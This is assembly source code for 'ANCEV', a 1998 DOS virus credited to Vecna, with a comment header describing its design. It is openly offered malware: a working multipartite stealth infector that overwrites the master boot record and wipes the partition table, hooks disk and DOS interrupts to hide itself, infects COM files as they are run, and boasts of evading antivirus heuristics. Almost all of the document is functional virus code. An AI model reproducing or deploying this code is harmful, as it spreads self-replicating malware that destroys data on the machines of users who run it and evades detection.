   ;[ANCEV] Multipartite MBR/COM stealth infector
   ;Copyright 1998 (c) Vecna
   ;
   ;When started, the virus check if a PSP exist in ds:0. If true, then we are in
   ;a infected file, so, we should infected the MBR and return to the host. A
   ;quick check for memory resident copy is done then. To infected the MBR, we
   ;read it, and check for a 0xE8 opcode(call). If it exists then we already are
   ;in the MBR, and dont infect it again. The clean copy of the MBR is stored
   ;in 0/0/2, and the MBR is overwritten by the virus code and memory contents,
   ;but before we write it, we put the marker (0xAA55) in the offset 0x1FE. The
   ;partition table is overwrited in this process, and the disk become, of course
   ;unacessible after a clean boot. Then four bytes of the start of the host are
   ;restored, and we jump to the host.
   ;
   ;If the PSP dont exists, then we are in a infected MBR. We reduce the memory
   ;size at 0x0:0x413 by 1 kb, and copy ourself to the gap we created in the top
   ;of memory. Then we hook interrupt 0x13.
   ;
   ;In each call of the interrupt 0x13, the virus check if is the sector 0/0/1
   ;from the first HDD. If so, we change it for 0/0/2 and lets teh call continue.
   ;Else, we make the call, and check if it start with 'MZ'. If so, we assume
   ;that DOS already is loaded, and hook interrupt 0x21, saving the original
   ;value in the interrupt 0x1. We also patch a jump in our code, to avoid the
   ;rehook of the interrupt.
   ;
   ;The hook in interrupt 0x21 only check for the function 0x4B, letting pass
   ;all other calls to the original vector. The control to the original vector
   ;is passed using a undocumented opcode 0xF1, BPICE, a single byte "INT 1"
   ;instruction.
   ;
   ;The infection is very simple, and no date is restored. In fact, a read-only
   ;attribute can stop the virus from infecting. We read 4 bytes from the begin
   ;of the file, and check if it is a EXE file, or have a "V" character in the
   ;4th byte. If so, the file is left alone. Then we go the the end of file,
   ;write our viral code, come back to the start of the file, and write a jump
   ;to the virus code, together with our infection mark. The file is then closed,
   ;and the infection process is finished.
   ;
   ;As a bonus, the virus isnt detected neither by AVP or DrWeb 4.00 heuristics

   .model tiny
   .code
   .386
   org 0

   BPICE  MACRO
          db 0f1h
   ENDM

   VStart:
          call Delta
   Delta:
          pop si
          sub di, di
          cmp byte ptr ds:[di], 0cdh
          jne GoMemory
   CheckRes:
          mov ax, -1
          int 13h
          cmp al, -2
          je RestoreHost
   InfectMbr:
          mov ax, 201h
          call DoMBRStandarBuffer
          cmp byte ptr [bx], 0e8h
          je RestoreHost
          mov ax, 301h
          push ax
          inc cx
          call DoHDD
          pop ax
          lea bx, [si+offset VStart-offset Delta]
          mov word ptr [si+offset VStart-offset Delta+510], 0aa55h
          call DoMBR
   RestoreHost:
          lea si, [si+offset HBytes-offset Delta]
          mov di, 100h
          push di
          movsd
          ret

   JWrite:
          db 0e9h
   JOfs   dw 0
          db 'V'

   HBytes db 0cdh, 20h, 90h, 90h

   GoMemory:
          mov ss, di
          mov sp, 7c00h
          push cs
          pop ds
          dec word ptr ds:[413h]
          int 12h
          shl ax, 6
          mov es, ax
          push ax
          push offset HighStart
          mov cx, 512 / 2
          sub si, offset Delta
          rep movsw
          retf

   HighStart:
          mov byte ptr es:[Switch-1], 0
          mov ax, word ptr ds:[13h*4]
          mov word ptr es:[Int13], ax
          mov ax, word ptr ds:[13h*4+2]
          mov word ptr es:[Int13+2], ax
          mov word ptr ds:[13h*4], offset Handler13
          mov word ptr ds:[13h*4+2], cs
          int 19h

   DoMBRStandarBuffer:
          lea bx, [si+offset VEnd-offset Delta]
   DoMBR:
          mov cx, 1
   DoHDD:
          mov dx, 80h
          int 13h
          ret

   ResTest:
          dec ax
          iret

   Handler13:
          cmp al, -1
          je ResTest
          dec cx
          jnz CheckEXE
          cmp dx, 80h
          jne CheckEXE
          inc cx
          inc cx
          call Call13
          pushf
          dec cx
          popf
          retf 2

   Call13:
          pushf
          db 9ah
   Int13  dd 0
          ret

   CheckEXE:
          inc cx
          call Call13
          pushf
          pusha
          push ds
          jmp $+2
   Switch:
          cmp word ptr es:[bx], 'ZM'
          jne Back
          mov byte ptr cs:[Switch-1], offset Back-offset switch
          push 0
          pop ds
          mov ax, word ptr ds:[21h*4]
          mov word ptr ds:[1h*4], ax
          mov ax, word ptr ds:[21h*4+2]
          mov word ptr ds:[1h*4+2], ax
          mov word ptr ds:[21h*4], offset Handler21
          mov word ptr ds:[21h*4+2], cs
   Back:
          pop ds
          popa
          popf
   IntRet:
          retf 2

   Handler21:
          cmp ah, 4bh
          jne Jump21
   Infect:
          pusha
          push ds
          mov ax, 3d02h
          BPICE
          jc Error
          xchg ax, bx
          push cs
          pop ds
          mov ah, 3fh
          mov cx, 4
          mov dx, offset HBytes
          BPICE
          cmp word ptr ds:[HBytes], 'ZM'
   CloseFile:
          je CloseError
          cmp byte ptr ds:[HBytes+3], 'V'
          je CloseFile
          mov ax, 4202h
          cwd
          sub cx, cx
          BPICE
          sub ax, 3
          mov word ptr ds:[JOfs], ax
          mov ah, 40h
          mov cx, offset VEnd
          BPICE
          mov ax, 4200h
          sub cx, cx
          BPICE
          mov ah, 40h
          mov cl, 4
          mov dl, LOW (offset JWrite)
          BPICE
   CloseError:
          mov ah, 3eh
          BPICE
   Error:
          pop ds
          popa
   Jump21:
          BPICE
          jmp IntRet

   VEnd   equ this byte

   End    VStart
